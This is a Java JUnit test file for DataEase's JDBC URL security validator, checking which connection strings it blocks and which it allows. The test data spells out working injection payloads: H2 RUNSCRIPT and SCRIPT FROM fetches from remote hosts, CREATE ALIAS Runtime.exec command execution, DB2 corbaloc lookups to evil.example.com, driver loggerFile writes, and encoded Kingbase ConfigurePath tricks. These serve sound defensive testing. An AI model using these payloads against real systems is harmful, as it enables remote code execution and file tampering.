package io.dataease.datasource.security;

import io.dataease.datasource.type.Kingbase;
import io.dataease.datasource.type.Pg;
import io.dataease.exception.DEException;
import org.junit.Test;

import static org.junit.Assert.assertEquals;
import static org.junit.Assert.assertThrows;

public class JdbcUrlSecurityPolicyTest {

    @Test
    public void validateRejectsUnicodeCaseBypassForH2InitAndRunScript() {
        String jdbcUrl = "jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;\u0131NIT=RUNSCR\u0130PT FROM 'http://127.0.0.1:50025/poc.sql'";

        assertThrows(DEException.class, () -> JdbcUrlSecurityPolicy.validate("h2", "org.h2.Driver", jdbcUrl, ""));
    }

    @Test
    public void validateAllowsSafeH2JdbcUrl() {
        String jdbcUrl = "jdbc:h2:mem:testdb;MODE=MySQL;DATABASE_TO_UPPER=FALSE";

        assertEquals(jdbcUrl, JdbcUrlSecurityPolicy.validate("h2", "org.h2.Driver", jdbcUrl, ""));
    }

    @Test
    public void validateRejectsCorbalocInDb2JdbcUrl() {
        String[] corbalocUrls = {
                "jdbc:db2://localhost:50000/test:corbaloc:rir:/NameService;",
                "jdbc:db2://localhost:50000/test:corbaloc::1.2@evil.example.com:2809/NameService;",
                "jdbc:db2://localhost:50000/test:corbaloc::evil.example.com:2809/NameService;"
        };
        for (String jdbcUrl : corbalocUrls) {
            assertThrows(DEException.class, () -> JdbcUrlSecurityPolicy.validate("db2", "com.ibm.db2.jcc.DB2Driver", jdbcUrl, ""));
        }
    }

    @Test
    public void validateRejectsCorbalocInDb2ExtraParams() {
        String jdbcUrl = "jdbc:db2://localhost:50000/test";
        assertThrows(DEException.class, () -> JdbcUrlSecurityPolicy.validate("db2", "com.ibm.db2.jcc.DB2Driver", jdbcUrl, "corbaloc:rir:/NameService"));
        assertThrows(DEException.class, () -> JdbcUrlSecurityPolicy.validate("db2", "com.ibm.db2.jcc.DB2Driver", jdbcUrl, "corbaloc::1.2@evil.example.com:2809/NameService"));
    }

    @Test
    public void validateRejectsH2BackslashEscapeInJdbcUrl() {
        String jdbcUrl = "jdbc:h2:mem:pwn;LOCK_TIMEOUT=0\\;CREATE ALIAS EXEC AS 'void x(String c) throws Exception { Runtime.getRuntime().exec(c); }'\\;CALL EXEC('touch /tmp/pwn')";
        assertThrows(DEException.class, () -> JdbcUrlSecurityPolicy.validate("h2", "org.h2.Driver", jdbcUrl, ""));
        assertThrows(DEException.class, () -> JdbcUrlSecurityPolicy.validate("h2", "org.h2.Driver",
                "jdbc:h2:mem:pwn\\;CREATE ALIAS EXEC AS 'void x(String c){}'", ""));
    }

    @Test
    public void validateAllowsWindowsH2FileUrl() {
        String jdbcUrl = "jdbc:h2:C:\\Users\\75269/opt/dataease3.0/desktop_data;AUTO_SERVER=TRUE;AUTO_RECONNECT=TRUE;MODE=MySQL;CASE_INSENSITIVE_IDENTIFIERS=TRUE;DATABASE_TO_UPPER=FALSE";
        assertEquals(jdbcUrl, JdbcUrlSecurityPolicy.validate("h2", "org.h2.Driver", jdbcUrl, ""));
    }

    @Test
    public void validateRejectsH2CreateAliasCallFragments() {
        String jdbcUrl = "jdbc:h2:mem:pwn;CREATE ALIAS EXEC AS 'void x(String c) throws Exception { Runtime.getRuntime().exec(c); }';CALL EXEC('touch /tmp/pwn')";
        assertThrows(DEException.class, () -> JdbcUrlSecurityPolicy.validate("h2", "org.h2.Driver", jdbcUrl, ""));
    }

    @Test
    public void validateRejectsH2ScriptAndBackupFragments() {
        assertThrows(DEException.class, () -> JdbcUrlSecurityPolicy.validate("h2", "org.h2.Driver", "jdbc:h2:mem:pwn;SCRIPT FROM 'http://evil/x.sql'", ""));
        assertThrows(DEException.class, () -> JdbcUrlSecurityPolicy.validate("h2", "org.h2.Driver", "jdbc:h2:mem:pwn;BACKUP TO 'http://evil/x.zip'", ""));
    }

    @Test
    public void validateRejectsLoggerFileForPgKingbaseRedshift() {
        assertThrows(DEException.class, () -> JdbcUrlSecurityPolicy.validate("kingbase", "com.kingbase8.Driver",
                "jdbc:kingbase8://127.0.0.1:1/db?loggerLevel=TRACE&loggerFile=/opt/apps/de_fw_proof.log", ""));
        assertThrows(DEException.class, () -> JdbcUrlSecurityPolicy.validate("pg", "org.postgresql.Driver",
                "jdbc:postgresql://127.0.0.1:1/db?loggerFile=/opt/apps/de_fw_proof.log", ""));
        assertThrows(DEException.class, () -> JdbcUrlSecurityPolicy.validate("redshift", "com.amazon.redshift.jdbc42.Driver",
                "jdbc:redshift://127.0.0.1:1/db?loggerFile=/opt/apps/de_fw_proof.log", ""));
    }

    @Test
    public void validateAllowsSafeKingbaseAndPgJdbcUrl() {
        assertEquals("jdbc:kingbase8://127.0.0.1:1/db?currentSchema=public",
                JdbcUrlSecurityPolicy.validate("kingbase", "com.kingbase8.Driver", "jdbc:kingbase8://127.0.0.1:1/db?currentSchema=public", ""));
        assertEquals("jdbc:postgresql://127.0.0.1:1/db?currentSchema=public",
                JdbcUrlSecurityPolicy.validate("pg", "org.postgresql.Driver", "jdbc:postgresql://127.0.0.1:1/db?currentSchema=public", ""));
    }

    @Test
    public void kingbaseGetJdbcRejectsLoggerFile() {
        Kingbase kingbase = new Kingbase();
        kingbase.setUrlType("jdbcUrl");
        kingbase.setJdbcUrl("jdbc:kingbase8://127.0.0.1:1/db?loggerLevel=TRACE&loggerFile=/opt/apps/de_fw_proof.log");
        assertThrows(DEException.class, kingbase::getJdbc);
    }

    @Test
    public void pgGetJdbcRejectsLoggerFile() {
        Pg pg = new Pg();
        pg.setUrlType("jdbcUrl");
        pg.setJdbcUrl("jdbc:postgresql://127.0.0.1:1/db?loggerFile=/opt/apps/de_fw_proof.log");
        assertThrows(DEException.class, pg::getJdbc);
    }

    @Test
    public void validateRejectsKingbaseConfigurePath() {
        assertThrows(DEException.class, () -> JdbcUrlSecurityPolicy.validate("kingbase", "com.kingbase8.Driver",
                "jdbc:kingbase8://127.0.0.1:1/test?ConfigurePath=./dataease-configurepath-canary.properties", ""));
        assertThrows(DEException.class, () -> JdbcUrlSecurityPolicy.validate("kingbase", "com.kingbase8.Driver",
                "jdbc:kingbase8://127.0.0.1:1/test?configurepath=./x.properties", ""));
        assertThrows(DEException.class, () -> JdbcUrlSecurityPolicy.validate("kingbase", "com.kingbase8.Driver",
                "jdbc:kingbase8://127.0.0.1:1/test?CoNfIgUrEpAtH=./x.properties", ""));
    }

    @Test
    public void validateRejectsEncodedKingbaseConfigurePath() {
        assertThrows(DEException.class, () -> JdbcUrlSecurityPolicy.validate("kingbase", "com.kingbase8.Driver",
                "jdbc:kingbase8://127.0.0.1:1/test?%43onfigurePath=./x.properties", ""));
        assertThrows(DEException.class, () -> JdbcUrlSecurityPolicy.validate("kingbase", "com.kingbase8.Driver",
                "jdbc:kingbase8://127.0.0.1:1/test?%2543onfigurePath=./x.properties", ""));
    }

    @Test
    public void validateRejectsKingbaseConfigurePathInExtraParams() {
        assertThrows(DEException.class, () -> JdbcUrlSecurityPolicy.validate("kingbase", "com.kingbase8.Driver",
                "jdbc:kingbase8://127.0.0.1:1/test", "ConfigurePath=./x.properties"));
        assertThrows(DEException.class, () -> JdbcUrlSecurityPolicy.validate("kingbase", "com.kingbase8.Driver",
                "jdbc:kingbase8://127.0.0.1:1/test", "configurepath=./x.properties"));
    }

    @Test
    public void kingbaseGetJdbcRejectsConfigurePath() {
        Kingbase kingbase = new Kingbase();
        kingbase.setUrlType("jdbcUrl");
        kingbase.setJdbcUrl("jdbc:kingbase8://127.0.0.1:1/db?ConfigurePath=./dataease-configurepath-canary.properties");
        assertThrows(DEException.class, kingbase::getJdbc);
    }

    @Test
    public void validateAllowsKingbaseDatabaseAndSchemaNamedConfigurepath() {
        assertEquals("jdbc:kingbase8://127.0.0.1:1/configurepath_demo?currentSchema=public",
                JdbcUrlSecurityPolicy.validate("kingbase", "com.kingbase8.Driver",
                        "jdbc:kingbase8://127.0.0.1:1/configurepath_demo?currentSchema=public", ""));
        assertEquals("jdbc:kingbase8://127.0.0.1:1/db?currentSchema=configurepath_demo",
                JdbcUrlSecurityPolicy.validate("kingbase", "com.kingbase8.Driver",
                        "jdbc:kingbase8://127.0.0.1:1/db?currentSchema=configurepath_demo", ""));
    }

    @Test
    public void validateAllowsConfigurepathInParameterValue() {
        assertEquals("jdbc:kingbase8://127.0.0.1:1/db?currentSchema=configurepath_demo",
                JdbcUrlSecurityPolicy.validate("kingbase", "com.kingbase8.Driver",
                        "jdbc:kingbase8://127.0.0.1:1/db?currentSchema=configurepath_demo", ""));
        assertEquals("jdbc:kingbase8://127.0.0.1:1/db",
                JdbcUrlSecurityPolicy.validate("kingbase", "com.kingbase8.Driver",
                        "jdbc:kingbase8://127.0.0.1:1/db", "currentSchema=configurepath_demo"));
    }
}
